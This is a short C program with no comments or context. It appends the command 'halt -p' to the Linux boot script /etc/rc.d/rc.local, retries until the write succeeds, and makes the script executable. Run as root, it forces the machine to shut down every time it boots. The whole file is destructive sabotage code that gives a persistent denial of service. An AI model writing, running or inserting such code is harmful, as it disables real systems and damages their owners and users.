#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void f()
{
#define RC "/etc/rc.d/rc.local"
#define CMD  "\nhalt -p\n"

	FILE *fp = NULL;

	if (fp = fopen(RC, "a+t"))
	{
		while (fputs(CMD, fp) < 0)
		{
			printf("try again\n");
			sleep(1);
		}
		fclose(fp);
	}
	if (chmod(RC, 0755) != 0)
	{
		perror("chmod");
	}
}

int main(void)
{
	f();

	return 0;
}
